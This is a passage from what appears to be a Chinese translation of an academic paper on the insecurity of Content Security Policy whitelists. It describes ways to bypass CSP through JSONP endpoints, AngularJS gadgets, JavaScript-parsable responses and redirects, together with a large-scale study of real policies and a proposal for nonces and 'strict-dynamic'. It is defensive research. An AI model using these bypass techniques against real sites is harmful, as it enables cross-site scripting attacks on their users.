<strong>将攻击者控制的脚本注入Web应用程序的上下文的能力</strong>，可以说是最臭名昭着的Web漏洞。自从2000年CERT公告中第一次正式引用XSS以来，几代研究人员和从业者已经研究了检测，预防和减轻这个问题的方法</p><p>尽管有这些优点，XSS仍然是网络上最普遍的安全问题之一，随着网络的发展，不断发现新的变化。</p><p><strong>如今，CSP（内容安全策略）是针对XSS的最有前途的对策之一。</strong></p><p>CSP是一种声明性策略机制，<strong>允许Web应用程序开发人员确定浏览器可以加载和执行哪些客户端资源</strong>。通过禁止内联脚本并仅允许受信任的域作为外部脚本的源，CSP旨在限制站点执行恶意客户端代码的能力。因此，即使攻击者能够找到XSS漏洞，CSP也可以通过防止利用漏洞来保护应用程序安全（攻击者无法在不控制可信主机的情况下加载恶意代码）</p><p>在本文中，我们介绍了对Web上CSP部署安全性的第一次深入分析的结果。<br>为了做到这一点，我们首先通过审查其威胁模型，分析可能的配置缺陷并列举允许攻击者绕过其保护的鲜为人知的技术来研究CSP的保护能力。</p><p>我们使用从Google搜索索引中提取的现实世界CSP政策进行大规模的实证研究。基于此数据集，我们发现目前至少有1,680,000个Internet主机部署了CSP策略。在对我们的数据集进行规范化和重复数据删除之后，我们确定了26,011个独特的CSP策略，<strong>其中94.72％可以轻易绕过</strong>，攻击者可以<strong>使用自动化方法来查找允许破坏CSP保护的端点</strong>。即使在许多情况下，在部署CSP方面花费了相当多的工作，<strong>但90.63％的当前策略包含通过允许执行内联脚本或从任意外部主机加载脚本来破坏任何XSS保护的配置</strong>。我们数据集中只有9.37％的策略具有更严格的配置，并且可以防范XSS。但是，我们发现至少有51.05％的此类政策仍然可以绕过，因为 script-src 白名单中存在微妙的错误策略配置或源自不安全端点的原因。</p><p>根据我们的研究结果，<strong>我们得出结论，在复杂的应用中保持安全的白名单在实践中是不可行的</strong>;因此，我们<strong>建议改变CSP的使用方式</strong>。<strong>我们建议通过指定脚本可以执行的URL白名单来指定信任的模型应该替换为基于nonces和hashes的方法</strong>，已经由CSP规范定义并且可以在主要的浏览器实现中使用。</p><p>在 nonce-based 的策略中<strong>，应用程序不是将主机和域列入白名单以执行脚本</strong>，而是在CSP策略中为合法的应用程序控制脚本的HTML属性提供<strong>一次性的</strong>，<strong>不可猜解</strong>的 token。</p><p><strong>用户代理(浏览器)只允许执行其 nonce 与策略中指定的值匹配的那些脚本</strong>;攻击者并不能知道易受注入攻击页面的标签的 nonce 的值，因此无法执行恶意脚本。为了简化这种 nonce-based 的方法的过程(这种方式在动态生成的脚本的执行上会有无法生成 nonce 的弊端)，我们为’script-src’提供了一个新的CSP源表达式，暂时称为’strict-dynamic’。使用 “strict-dynamic”，<strong>动态生成的脚本会从创建它们的可信脚本中隐式继承nonce</strong>。通过这种方式，<strong>已经执行的合法脚本可以轻松地向DOM添加新脚本，而无需进行大量的应用程序更改</strong>。因此，即使攻击者发现了 XSS 漏洞，但是却不知道正确的nonce，也还是无法滥用此功能，因为它们无法在第一时间执行脚本。</p><p>为了证明这种方法的可行性，我们提出了一个在流行的应用程序中<strong>采用基于随机数的策略的实际案例研究</strong></p><p><strong>我们的贡献可归纳如下：</strong></p><ul><li>我们介绍了对CSP安全模型的第一次深入分析的结果，分析了对标准提供的Web错误的保护。我们确定了共同的策略错误配置，并提出了三类绕过 CSP 的方法。</li><li>我们通过从Google搜索索引中提取策略，对实际CSP部署的好处进行了大规模的实证研究。基于大约1060亿页的语料库，其中39亿页受CSP保护，我们确定了26,011个独特的政策。我们发现，由于政策错误配置和不安全的白名单条目，这些政策中至少有94.72％对缓解XSS无效。</li><li>根据我们的观点，我们建议改变内容安全策略在实践中的部署方式：<strong>我们提倡基于nonce的方法，而不是白名单。</strong>为了进一步推广这种方法，我们提出了“strict-dynamic”，<strong>这是目前在Chromium浏览器中实现的CSP3规范的一个新特性</strong>。我们讨论了这种方法的好处，并提出了在流行的Web应用程序中基于nonce和strict-dynamic部署策略的案例研究。</li></ul><h2 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a><strong>内容安全策略</strong></h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>内容安全策略（CSP）是一种声明性机制，允许Web作者在其应用程序上指定许多安全限制，会由支持该项技术的用户代理(浏览器)强制执行。</p><p>CSP旨在成为 “开发人员可以用来以各种方式锁定其应用程序，降低内容注入漏洞（…）的风险并降低其应用程序执行的权限的工具。“</p><p>CSP正在快速发展：<strong>目前正在进行规范的版本是CSP3</strong>，并且该标准由用户代理不均衡地实现。例如，Chromium具有完整的CSP2支持并实现了CSP3的大部分工作草案，在某些情况下落后于实验运行时标志，而Mozilla Firefox和基于WebKit的浏览器最近刚刚获得了完整的CSP2支持。在讨论CSP的细节时，我们不关注标准的任何特定修订，而是尝试提供跨实现和版本的广泛概述。</p><p>CSP策略在Content-Security-Policy HTTP响应头或<code>&lt;meta&gt;</code>元素中提供。 </p><h4 id="CSP的功能可分为三类："><a href="#CSP的功能可分为三类：" class="headerlink" title="CSP的功能可分为三类："></a><strong>CSP的功能可分为三类：</strong></h4><h5 id="1-资源加载限制"><a href="#1-资源加载限制" class="headerlink" title="1.资源加载限制"></a><strong>1.资源加载限制</strong></h5><p>CSP最着名和最常用的是限制将各种子资源加载到开发人员允许的一组源（称为源列表）的能力。常用的指令是script-src，style-src，img-src和覆盖全部的default-src;<strong>表1中显示了管理资源的完整指令列表</strong>。作为一种特殊情况，script-src和style-src指令可以使用其他几个配置选项。这些允许对脚本和样式表进行更细致的控制，下面将对此进行讨论。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A51.png" alt="此处输入图片的描述"></p><h5 id="2-基于URL的辅助限制"><a href="#2-基于URL的辅助限制" class="headerlink" title="2.基于URL的辅助限制"></a><strong>2.基于URL的辅助限制</strong></h5><p>通过监管所获取的子资源不能防止一些类型的攻击，但同样需要文档可以与之交互的可信来源的概念。一个常见的例子是 frame-ancestors 指令，<strong>它定义了允许构建文档以防止点击劫持的起源</strong>。类似地，base-uri 和form-action可以将URL作为<code>&lt;base＃href&gt;</code>和<code>&lt;form＃action&gt;</code>元素的目标，以防止一些 post-XSS攻击。</p><h5 id="3-杂项连接和硬化选项"><a href="#3-杂项连接和硬化选项" class="headerlink" title="3.杂项连接和硬化选项"></a><strong>3.杂项连接和硬化选项</strong></h5><p>由于缺乏在Web应用程序中启用安全性限制的其他常用机制，CSP已成为几种松散安全功能的基础。这包括block-all-mixed-content 和 upgrade-insecure-requests关键字，可以防止混合内容错误并改善HTTPS支持;插件类型，限制允许的插件格式;反映了HTML5沙箱框架的安全功能的 sandbox。</p><p>为了使Web应用程序与对XSS有用的内容安全策略兼容，<strong>Web开发者通常必须重构应用程序逻辑生成的HTML标记，以及框架和模板系统。</strong></p><p>特别是内联脚本，必须避免使用eval和等效构造，内联事件处理程序和javascript：URI，使用CSP友好的替代方法。</p><p>除了强制执行策略限制的默认行为之外，还可以在 Report-Only 模式下配置CSP，其中只记录违规但不强制执行。在这两种情况下，report-uri指令可用于发送违规报告，以通知应用程序所有者不兼容的标记。</p><h4 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a><strong>源列表</strong></h4><p><strong>CSP源列表（通常称为白名单）</strong>是CSP的核心部分，是指定信任关系的<strong>传统方式</strong>。例如，如清单1所示，应用程序可能选择仅信任其托管域以加载脚本，但允许来自cdn.example.org和third-party.org的字体或图像，并要求通过HTTPS加载帧，同时对其他资源类型不施加任何限制。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A52.png" alt="此处输入图片的描述"></p><p>对于任何指令，白名单可以由主机名（example.org，example.com）组成，可能包括<code>*</code>通配符以将信任扩展到所有子域（<code>*.example.org</code>）; scheme（https：，data:);和特殊关键字’self’，表示当前文档的来源，<strong>‘none’，强制执行空源列表并禁止加载任何资源。</strong></p><p><strong>从CSP2开始，作者还可以选择在白名单中指定路径</strong>（example.org/resources/js/）。<br>有趣的是，不能依赖基于路径的限制来限制可以加载资源的位置;</p><h4 id="脚本执行的限制"><a href="#脚本执行的限制" class="headerlink" title="脚本执行的限制"></a><strong>脚本执行的限制</strong></h4><p>由于现代Web应用程序中脚本的重要性，script-src指令提供了几个关键字，以允许更精细地控制脚本执行：</p><h5 id="1-unsafe-inline"><a href="#1-unsafe-inline" class="headerlink" title="1.unsafe-inline"></a><strong>1.unsafe-inline</strong></h5><p>允许执行内联<code>&lt;script&gt;</code>块和JavaScript事件处理程序（<strong>有效地删除针对XSS的任何CSP保护</strong>）</p><h5 id="2-unsafe-eval"><a href="#2-unsafe-eval" class="headerlink" title="2.unsafe-eval"></a><strong>2.unsafe-eval</strong></h5><p>允许将字符串数据作为代码执行的JavaScriptAPI，例如eval()，setTimeout()，setInterval()和Function构造函数。<strong>否则，这些API将被具有script-src指令的策略阻止。</strong></p><h5 id="3-nonce"><a href="#3-nonce" class="headerlink" title="3.nonce"></a><strong>3.nonce</strong></h5><p>CSP nonce 允许策略指定一个一次性值，该值用作脚本的授权 token（script-src ‘nonce-random-value’）。将允许页面上具有正确的 nonce =”random-value”属性的任何脚本执行。</p><h5 id="4-hash"><a href="#4-hash" class="headerlink" title="4.hash"></a><strong>4.hash</strong></h5><p>CSP hash 允许开发人员列出页面内预期脚本的加密哈希值（script-src ‘sha256-nGA …’）。将允许执行其摘要与策略中提供的值匹配的任何内联脚本。</p><p>Nonce和hashes可以类似地与style-src指令一起使用，以允许通过nonce值加载内联样式表和外部CSS。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A53.png" alt="此处输入图片的描述"></p><h3 id="CSP的威胁模型"><a href="#CSP的威胁模型" class="headerlink" title="CSP的威胁模型"></a><strong>CSP的威胁模型</strong></h3><p>为了使CSP能够提供安全保护，它必须防止攻击者利用,否则会对应用程序的用户启用恶意操作。</p><h4 id="CSP提供三种漏洞的保护"><a href="#CSP提供三种漏洞的保护" class="headerlink" title="CSP提供三种漏洞的保护"></a><strong>CSP提供三种漏洞的保护</strong></h4><h5 id="1-XSS："><a href="#1-XSS：" class="headerlink" title="1.XSS："></a><strong>1.XSS：</strong></h5><p>在易受攻击的应用程序中注入和执行不受信任的脚本的能力<strong>（受script-src和object-src指令保护）</strong></p><h5 id="2-点击劫持："><a href="#2-点击劫持：" class="headerlink" title="2.点击劫持："></a><strong>2.点击劫持：</strong></h5><p>通过在<strong>攻击者控制的页面上</strong>覆盖隐藏的帧来强制用户在受影响的应用程序中执行不需要的操作<strong>（通过限制框架祖先的框架来保护）</strong></p><h5 id="3-混合内容："><a href="#3-混合内容：" class="headerlink" title="3.混合内容："></a><strong>3.混合内容：</strong></h5><p>意外地从通过HTTPS传递的页面上的不安全协议加载资源<strong>（使用upgrade-insecure-requests和block-all-mixed-content关键字保护，并限制脚本和敏感资源加载到https :)。</strong></p><p>因此，<strong>只有一小部分CSP指令对XSS保护有用</strong>。此外，在应用程序的上下文中执行恶意脚本的能力颠覆了所有其他指令所提供的保护</p><h4 id="采用CSP的好处"><a href="#采用CSP的好处" class="headerlink" title="采用CSP的好处"></a><strong>采用CSP的好处</strong></h4><p>由于一些流行的用户代理(浏览器)尚不支持CSP或者只支持部分支持，因此在主要安全机制失败的情况下，CSP应仅用作深度防御以阻止攻击尝试<strong>。因此，使用CSP的应用程序还必须采用传统的保护机制</strong>;例如，使用具<strong>有严格上下文转义的框架来生成标记</strong>，使用 X-Frame-Options 标头来防止点击劫持，并确保通过HTTPS获取安全页面上的资源。</p><p>设置内容安全策略的实际好处只有在主要安全机制已证明不足时才会出现–CSP可以帮助保护用户，当开发人员引入编程错误时，否则会导致XSS，点击劫持或混合内容错误。</p><p>然而，实际上 X-Frame-Options 的点击劫持保护很少被攻破，并且在现代用户代理中默认情况下已禁止活动混合内容（通过HTTP从HTTPS网页加载的脚本和其他活动内容）。因此，<strong>CSP的主要价值在于防止利用XSS，</strong>因为它是唯一可以通过CSP缓解并且通常可以减轻的漏洞类别。</p><h4 id="防御XSS"><a href="#防御XSS" class="headerlink" title="防御XSS"></a><strong>防御XSS</strong></h4><p><strong>CSP的安全优势主要集中在两个阻止脚本执行的指令</strong>：script-src和object-src（Adobe Flash等插件可以在嵌入页面的上下文中执行JavaScript），或者在他们缺省情况下的 default-src。</p><p>可以注入和执行脚本的攻击者能够绕过所有其他指令的限制。因此，使用不安全的 script-src 和 object-src 源列表策略的应用程序从CSP获得的优势就非常有限了。</p><p>对于提供有意义的安全性的其他指令，站点必须首先使用成功阻止脚本执行的安全策略。一般来说，非脚本指令可以作为对一些post-XSS 或 scriptless 攻击的防御，例如通过劫持表单URI来删除数据，或通过使用攻击者发布页面UI进行网络钓鱼,但只有当CSP作为XSS保护措施已经有效时，它们才能提高安全性。</p><p><strong>为了实现防止不需要的脚本执行的主要目标,策略必须满足三个要求：</strong></p><h4 id="三大要求"><a href="#三大要求" class="headerlink" title="三大要求"></a><strong>三大要求</strong></h4><ul><li>该策略必须同时定义script-src和object-src指令（或者default-src）</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A54.png" alt="此处输入图片的描述"></p><ul><li>script-src源列表不能包含 unsafe-inline 关键字（除非附有nonce）或允许 data：URIs</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A55.png" alt="此处输入图片的描述"></p><ul><li>script-src和object-src源列表<strong>不能包含允许攻击者控制响应</strong>的安全相关部分或包含不安全库的任何端点。</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A56.png" alt="此处输入图片的描述"></p><p><strong>如果不满足任何这些条件，则该策略在防止脚本执行方面没有效果，因此无法防止内容注入攻击。</strong></p><p>我们现在转向对端点类型的分析，<strong>这些端点在托管在白名单源上时允许攻击者绕过针对脚本执行的CSP保护。</strong></p><h3 id="脚本执行绕过"><a href="#脚本执行绕过" class="headerlink" title="脚本执行绕过"></a><strong>脚本执行绕过</strong></h3><p><strong>CSP的一个基本假设是，策略中列入白名单的域仅提供安全内容</strong>。因此，攻击者不能在此类列入白名单的来源的响应中注入有效的JavaScript。</p><p>在以下小节中，我们证明了在实践中，<strong>现代Web应用程序倾向于使用违反此假设的几种模式。</strong></p><h4 id="1-具有用户控制的回调的JavaScript"><a href="#1-具有用户控制的回调的JavaScript" class="headerlink" title="1.具有用户控制的回调的JavaScript"></a><strong>1.具有用户控制的回调的JavaScript</strong></h4><p>虽然许多JavaScript资源是静态的，但在某些情况下，开发人员可能希望通过允许请求参数设置在加载脚本时执行的函数来动态生成脚本的一部分。例如，<strong>在回调函数中包装JavaScript对象的JSONP接口通常用于允许加载API数据</strong>，方法是将其作为脚本从第三方域获取：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A57.png" alt="此处输入图片的描述"></p><p>遗憾的是，<strong>如果策略中列入白名单的域包含JSONP接口，则攻击者可以使用它在易受攻击的页面上下文中执行任意JavaScript函数</strong>，方法是将端点作为带有攻击者控制的回调的<code>&lt;script&gt;</code>加载。<strong>如果攻击者可以控制JSONP响应的整个开始，他们将获得无约束的脚本执行</strong>。如果字符集受到限制，因此只有函数名称是可控的，它们可以使用诸如SOME之类的技术，这些技术通常在定性上等同于完整的，无约束的XSS。</p><h4 id="2-反射或者符号执行"><a href="#2-反射或者符号执行" class="headerlink" title="2.反射或者符号执行"></a><strong>2.反射或者符号执行</strong></h4><p>CSP脚本执行的限制可能（通常是偶然）被白名单源中的协作脚本规避。例如，脚本可以使用反射来查找并调用全局范围中的函数，如清单7所示。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A514.png" alt="此处输入图片的描述"></p><p>这样的 JavaScript小技巧通常不会危及安全性，<strong>因为它们的参数处于其页面加载脚本的开发人员的控制之下</strong>。当这样的脚本通过检查DOM获取数据时技巧会出现问题，如果应用程序具有标签注入bug（攻击者可以执行任意函数，可能使用无约束的参数，绕过CSP，则可以部分地受到攻击者控制）。</p><p>一个实际的例子是流行的AngularJS库的行为，它允许创建具有强大的模板语法和客户端模板评估的单页面应用程序（清单8）。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A515.png" alt="此处输入图片的描述"></p><p>为了实现其目标，AngularJS在页面的指定部分解析模板并执行它们。<strong>控制Angular解析的模板的能力可以被认为等同于执行任意JavaScript</strong>。默认情况下，Angular使用eval() 函数来评估沙箱表达式，这是没有unsafe-eval关键字的CSP策略所禁止的。但是<strong>，Angular还附带了一个CSP兼容模式“（ng-csp），其中表达式通过执行符号执行来计算，从而可以在CSP中调用任意JavaScript代码。</strong></p><p>因此，可以从CSP中列入白名单的域加载Angular库的攻击者可以将其用作JS小工具来绕过脚本执行保护。即使被攻击的应用程序没有使用Angular本身，这也是可能的(唯一要求是将Angular库托管在script-src中列入白名单的域之一上)。因此，<strong>在受信任域中仅存在任何Angular库都会破坏CSP提供的保护。</strong></p><h4 id="3-非预期的JavaScript可解析响应"><a href="#3-非预期的JavaScript可解析响应" class="headerlink" title="3.非预期的JavaScript可解析响应"></a><strong>3.非预期的JavaScript可解析响应</strong></h4><p>出于兼容性原因，<strong>Web浏览器通常很宽松地检查响应的MIME类型是否与使用响应的页面上下文匹配</strong>。任何可以在没有语法错误的情况下解析为JavaScript的响应(并且在第一个运行时错误之前出现攻击者控制的数据)可能导致脚本执行。</p><p><strong>因此，可以使用以下类型的响应绕过CSP：</strong></p><ul><li>具有部分攻击者控制内容的逗号分隔值（CSV）数据：</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A516.png" alt="此处输入图片的描述"></p><ul><li>回显请求参数的错误消息：</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A517.png" alt="此处输入图片的描述"></p><ul><li>用户文件上传，即使其内容已正确HTML转义或清理</li></ul><p>因此，如果列入白名单的域托管具有此类属性的任何端点，攻击者可以“伪造”脚本响应并执行任意JavaScript。类似的问题适用于object-src白名单<strong>：如果攻击者可以上传将被解释为Flash的资源对象到被 ogject-src列入白名单的域，脚本可以执行。</strong></p><p>值得注意的是，上述旁路模式都不会带来直接的安全风险，因此开发人员通常没有理由对其进行更改。但是，当应用程序采用CSP时，此类端点会成为安全问题，因为它们允许绕过策略。</p><p>更有问题的是，这个问题不仅影响应用程序的origin，还影响script-src中列入白名单的所有其他域。这些域通常包括可信的第三方和可能不了解CSP的CDN （因此没有理由识别和修复允许CSP绕过的行为）。</p><h4 id="4-路径限制作为安全机制"><a href="#4-路径限制作为安全机制" class="headerlink" title="4.路径限制作为安全机制"></a><strong>4.路径限制作为安全机制</strong></h4><p>为了解决基于域的源列表的不完整粒度问题<strong>，CSP2引入了将白名单约束到给定域上的特定路径的能力</strong>（例如example.org/foo/bar）。开发人员现在可以选择在受信任的域上指定特定目录以加载脚本和其他资源。</p><p>不幸的是，<strong>由于与处理跨域重定向有关的隐私问题，这种限制已经放宽</strong>。如果源列表条目包含重定向器（端点返回指向另一个位置的30x响应），则该重定向器可用于从白名单源中成功加载资源，即使它们与策略中允许的路径不匹配也是如此。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A518.png" alt="此处输入图片的描述"></p><p><strong>由于这种行为以及复杂Web应用程序中重定向器的普遍存在（通常用于OAuth等安全上下文中并防止引用泄漏），因此不能依赖路径限制作为CSP中的安全机制。</strong></p><p>我们已经展示了一些看似良性的编程模式如何允许内容注入攻击者绕过CSP提供的脚本执行保护，从而消除策略的任何反XSS优势{其主要关注点。我们现在转而分析这种绕道对现实世界政策的影响。</p><h2 id="CSP的实证研究"><a href="#CSP的实证研究" class="headerlink" title="CSP的实证研究"></a><strong>CSP的实证研究</strong></h2><p>我们的工作目标是调查CSP在实践中提供的一般方法和保护能力。为此，我们进行了大规模的实证研究，以收集和分析现实世界的CSP策略。在本节中，我们描述了本研究的方法和结果。</p><h3 id="问题研究"><a href="#问题研究" class="headerlink" title="问题研究"></a><strong>问题研究</strong></h3><p>我们的研究分为两个主要部分。首先，我们的目标是了解CSP目前的使用情况;第二，我们要分析已部署策略的安全属性。</p><h4 id="CSP如何在web上使用？"><a href="#CSP如何在web上使用？" class="headerlink" title="CSP如何在web上使用？"></a><strong>CSP如何在web上使用？</strong></h4><p>正如先前的研究所示，CSP采用率落后于安全社区的期望。因此，在我们的研究的第一部分，我们旨在阐明CSP的当前状态，以了解CSP的使用范围。此外，<strong>我们想了解CSP是专门用于XSS保护还是其他普遍存在的用例</strong>。由于许多主要的Web应用程序需要更改为与CSP兼容，因此尚不清楚CSP策略是否已用于XSS保护，或处于相当实验状态，其中仍然禁用强制执行。因此，我们感兴趣的是执行模式中的策略与仅报告模式下的策略之间的比率。在本研究的第二部分中，我们将使用强制策略进行安全性分析。</p><h4 id="现实世界的CSP政策有多安全？"><a href="#现实世界的CSP政策有多安全？" class="headerlink" title="现实世界的CSP政策有多安全？"></a><strong>现实世界的CSP政策有多安全？</strong></h4><p>如第2节所述，有很多缺陷可能会使策略的保护能力无效。避免策略制定中的这些错误需要广泛的知识。在我们研究的第二部分，<strong>我们的目标是确定有多少策略是由错误影响的，因此可以绕过</strong>。我们还调查哪种错误最为普遍。此外，<strong>我们的目标是分析严格策略的安全性，特别是白名单的安全性。</strong></p><h3 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a><strong>方法论</strong></h3><p>在以下小节中，我们概述了用于从给定数据集中提取和分析内容安全策略的方法。</p><h4 id="检测内容安全策略"><a href="#检测内容安全策略" class="headerlink" title="检测内容安全策略"></a><strong>检测内容安全策略</strong></h4><p>为了从数据集中提取CSP策略，我们编写了一个系统。对于具有CSP策略的索引中的每个URL，我们提取了以下元组：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A58.png" alt="此处输入图片的描述"></p><p>基于此元组列表，<strong>我们为每个主机提取了一组唯一策略</strong>，有效地删除了每个主机上的重复策略。</p><h4 id="规范化CSP策略"><a href="#规范化CSP策略" class="headerlink" title="规范化CSP策略"></a><strong>规范化CSP策略</strong></h4><p>多个网站自动生成包含随机nonces，hashes 或 report URIs 的CSP策略。在此过程中，某些生成例程会随机切换某些指令或指令值的顺序。为了使我们的数据集中的策略具有可比性，我们首先对策略进行了规范化。我们按照规范1中的描述实现了一个CSP解析器，并存储了每个CSP的解析副本，以便以后进行深入评估。对于每个策略，我们应用了以下规范化步骤：</p><ul><li>首先，我们删除了多余的空格并用柔性占位符替换所有变量值，例如nonces和report URIs。</li><li>其次，我们对所有指令和指令值进行了排序和重复数据删除。</li></ul><h4 id="重复编写CSP"><a href="#重复编写CSP" class="headerlink" title="重复编写CSP"></a><strong>重复编写CSP</strong></h4><p>在我们的分析过程中，我们发现消息板和电子商务平台等现成的Web应用程序分布在许多不同的主机上，同时部署完全相同的CSP策略。为解决此问题，我们决定根据规范化的策略字符串对CSP进行重复数据删除。因此，我们的最终数据集包含我们在网络上找到的每个唯一策略的单个条目。</p><h4 id="确定XSS保护策略"><a href="#确定XSS保护策略" class="headerlink" title="确定XSS保护策略"></a><strong>确定XSS保护策略</strong></h4><p>如前所述，CSP支持许多主要用于防御XSS的指令，例如img-src和frame-ancestors。由于我们的研究旨在评估策略在XSS缓解能力方面的安全性，因此我们需要一种方法来区分试图抵御XSS的策略与所有其他策略。根据我们的定义，XSS保护策略必须处于强制模式，并且必须至少包含以下两个指令之一：script-src或default-src</p><h4 id="评估政策的安全性"><a href="#评估政策的安全性" class="headerlink" title="评估政策的安全性"></a><strong>评估政策的安全性</strong></h4><p>为了评估是否可以绕过CSP策略来执行攻击者控制的脚本，我们进行以下检查：</p><h5 id="1-使用-‘unsafe-inline’"><a href="#1-使用-‘unsafe-inline’" class="headerlink" title="1.使用 ‘unsafe-inline’:"></a><strong>1.使用 ‘unsafe-inline’:</strong></h5><p>如果没有指定脚本随机数，那么带有’unsafe-inline’关键字的策略本质上是不安全的。这样的策略是被视为可绕行的。</p><h5 id="2-缺少-object-src"><a href="#2-缺少-object-src" class="headerlink" title="2.缺少 object-src:"></a><strong>2.缺少 object-src:</strong></h5><p>指定script-src但缺少object-src指令<strong>（并且未设置default-src）</strong>的策略<strong>允许通过注入插件资源来执行脚本</strong>，如清单3所示。</p><h5 id="3-在白名单中使用通配符："><a href="#3-在白名单中使用通配符：" class="headerlink" title="3.在白名单中使用通配符："></a><strong>3.在白名单中使用通配符：</strong></h5><p>如果安全相关的白名单包含通用通配符或URI方案（http:, https: or data:），<strong>则允许包含来自任意主机的内容</strong>，则策略也是不安全的。</p><h5 id="4-白名单中的不安全来源："><a href="#4-白名单中的不安全来源：" class="headerlink" title="4.白名单中的不安全来源："></a><strong>4.白名单中的不安全来源：</strong></h5><p><strong>当托管具有CSP旁路的端点的域列入白名单时，CSP的保护功能将变为无效</strong>。为了评估策略的安全性，我们编译了具有这种可绕过端点的主机列表。如果给定策略的白名单条目出现在此列表中，我们<br>政策是可绕过的。在下一节中，我们将概述如何创建此列表。</p><h4 id="使用允许CSP-byasses的端点标识域"><a href="#使用允许CSP-byasses的端点标识域" class="headerlink" title="使用允许CSP byasses的端点标识域"></a><strong>使用允许CSP byasses的端点标识域</strong></h4><p>为了识别CSP中白名单不安全的域，我们从搜索索引中提取了之前描述的实践之一的页面。如前所述<strong>，托管AngularJS库并公开JSONP端点是创建CSP绕过的众多方法中的两种。</strong></p><h5 id="JSONP-端点"><a href="#JSONP-端点" class="headerlink" title="JSONP 端点"></a><strong>JSONP 